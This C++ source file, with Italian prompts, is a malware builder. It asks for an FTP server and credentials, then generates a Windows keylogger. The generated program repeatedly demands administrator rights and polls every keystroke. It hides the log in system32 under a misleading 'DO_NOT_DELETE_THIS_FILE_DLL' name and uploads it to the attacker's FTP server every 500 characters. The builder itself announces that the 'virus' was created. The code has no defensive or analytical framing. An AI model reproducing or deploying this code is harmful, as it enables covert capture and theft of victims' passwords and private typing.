#include<iostream>
#define REFER 100
#define dim9 100
using namespace std;
void key_logger_4(){
system("cls");
intestazione();
char server_name[REFER],server_username[REFER],server_password[REFER];

      fflush(stdin);
      cout<<endl<<"Inserisci nome del tuo server dove verra' inviato il file log (ES: example.com):  "<<endl;
      cin.getline(server_name,sizeof(server_name));

      cout<<endl<<"Inserisci username FTP:  ";
      cin.getline(server_username,sizeof(server_username));
      
      cout<<endl<<"Inserisci password FTP: ";
      cin.getline(server_password,sizeof(server_password));

      system("cd..");
      system("mkdir output");

      FILE *keylogger_4;
      
      keylogger_4 = fopen(".\\output\\keylogger_4.cpp","w");
      fprintf(keylogger_4,"#include<iostream>\n#include<time.h>\n#include<unistd.h> \n#include <windows.h>\n#include <sstream>\n#include <fstream>\n#include<Lmcons.h>\n\nusing namespace std;\n\nBOOL IsRunAsAdministrator()\n{\nBOOL fIsRunAsAdmin = FALSE;\nDWORD dwError = ERROR_SUCCESS;\nPSID pAdministratorsGroup = NULL;\nSID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\nif (!AllocateAndInitializeSid(\n&NtAuthority, \n2, \nSECURITY_BUILTIN_DOMAIN_RID, \nDOMAIN_ALIAS_RID_ADMINS, \n0, 0, 0, 0, 0, 0, \n&pAdministratorsGroup))\n{\ndwError = GetLastError();\ngoto Cleanup;\n}\nif (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))\n{\ndwError = GetLastError();\ngoto Cleanup;\n}\nCleanup:  \nif (pAdministratorsGroup)\n{\nFreeSid(pAdministratorsGroup);\npAdministratorsGroup = NULL;\n}\nif (ERROR_SUCCESS != dwError)\n{\nthrow dwError;\n}\nreturn fIsRunAsAdmin;\n}\nvoid ElevateNow()\n{\nBOOL bAlreadyRunningAsAdministrator = FALSE;\ntry\n{\nbAlreadyRunningAsAdministrator = IsRunAsAdministrator();\n}\ncatch(...)\n{}\nif(!bAlreadyRunningAsAdministrator)\n{\nchar szPath[MAX_PATH];\nif (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))\n{\nSHELLEXECUTEINFO sei = { sizeof(sei) };\nsei.lpVerb = \"runas\";\nsei.lpFile = szPath;\nsei.hwnd = NULL;\nsei.nShow = SW_NORMAL;\nif (!ShellExecuteEx(&sei))\n{\nDWORD dwError = GetLastError();\nif (dwError == ERROR_CANCELLED)\nCreateThread(0,0,(LPTHREAD_START_ROUTINE)ElevateNow,0,0,0);\n}\n}\n}\nelse\n{\n}\n}\n");
      fprintf(keylogger_4,"void WriteLog(LPCSTR text) {\nchar usr[21];\nstring username; \nDWORD lusr = sizeof(usr); \nif (GetUserName(usr, &lusr)) \nusername = usr; \nstringstream mystream; \nmystream<<\"C:\\\\windows\\\\system32\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\"; \nstring concatenated = mystream.str();\nofstream outfile; \noutfile.open(concatenated.c_str(), ofstream::app); \noutfile << text; \noutfile.close();\n}\nbool KeyIsListed(int iGetKey) {\nswitch (iGetKey)\n{\ncase VK_OEM_2:\ncout<<\" ? \"<<endl;\nWriteLog(\" ? \\n\");\nbreak;\ncase VK_OEM_7:\ncout<<\" ' \";\nWriteLog(\" ' \\n\");\nbreak;\ncase VK_LBUTTON: \ncout << \" *LeftM* \\n\" << endl;\nWriteLog(\" *LeftM* \\n\");\nbreak;\ncase VK_RBUTTON: \ncout << \" *RightM* \" << endl; \nWriteLog(\" *RightM* \\n\");\nbreak;\ncase VK_CONTROL: \ncout << \" *Ctrl* \\n\" << endl; \nWriteLog(\" *Ctrl* \\n\");\nbreak;\ncase VK_SHIFT: \ncout << \" *Shift* \\n\" << endl; \nWriteLog(\" *Shift* \\n\");\nbreak;\ncase VK_RETURN: \ncout << \" *ENTER* \"<<endl; \nWriteLog(\" *ENTER* \\n\");\ncase VK_SPACE:\ncout << \"  \"<<endl; \nWriteLog(\"  \");\nbreak;\ncase VK_OEM_PLUS:\ncout<<\" + \"<<endl;\nWriteLog(\" + \\n\");\nbreak;\ndefault: return FALSE;\n}\n}\n");
      fprintf(keylogger_4,"void file(){	\nchar usr[21];\nstring username; \nDWORD lusr = sizeof(usr); \nif (GetUserName(usr, &lusr)) \nusername = usr; \nstringstream fffstream; \nfffstream<<\"C:\\\\windows\\\\system32\\\\file.txt\"; \nstring concatenated_2 = fffstream.str();\nFILE *server_uploader;\nserver_uploader = fopen(concatenated_2.c_str(),\"w\");\nfprintf(server_uploader,\"%s\\n%s\\n\");\nfprintf(server_uploader,\"put C:\\\\windows\\\\system32\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\\nquit\\n\");\nfclose(server_uploader);\n}\nint main(){\nif(IsRunAsAdministrator()){\nfile();\nsystem(\"del C:\\\\windows\\\\system32\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\");\nchar key; \nwhile (TRUE)\n{\nSleep(10); \n\nfor (key = 8; key <= 190; key++) \n{\nif (GetAsyncKeyState(key) == -32767) {\nif (KeyIsListed(key) == FALSE)\n{\nchar usr[21];\nstring username;\nDWORD lusr = sizeof(usr);\nif (GetUserName(usr, &lusr))\nusername = usr;\nstringstream mystream;\n",server_username,server_password);
      fprintf(keylogger_4,"mystream<<\"C:\\\\windows\\\\system32\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\"; \nstring concatenated = mystream.str();\ncout << key; \nofstream outfile;\noutfile.open(concatenated.c_str(), ofstream::app);\noutfile << key;\noutfile.close();\nint lettere;\nlettere++;\nif (lettere==500){      //se sono state inseite 500 lettere aggiorna il file su server caricandolo\ncout<<endl<<\"Dimensione raggiunta!\"<<endl;\nsystem(\"ftp -s:C:\\\\windows\\\\system32\\\\file.txt ftp.%s\");  //invio file al server\nlettere = 0;\n}\n}\nelse {\n} \n}\n}\n}\n}else\n{\nElevateNow();\n} \nreturn EXIT_SUCCESS;\n}",server_name);     
      fclose(keylogger_4);
      
      waiting();
      
      	    ifstream check ("output\\keylogger_4.cpp");
            if (check)
            cout <<"Virus creato correttamente. Salvato nella directory: output"<<endl;
            else
            cout<<"Errore nell\'elaborazione, il virus non e' stato creato";
      
      
}
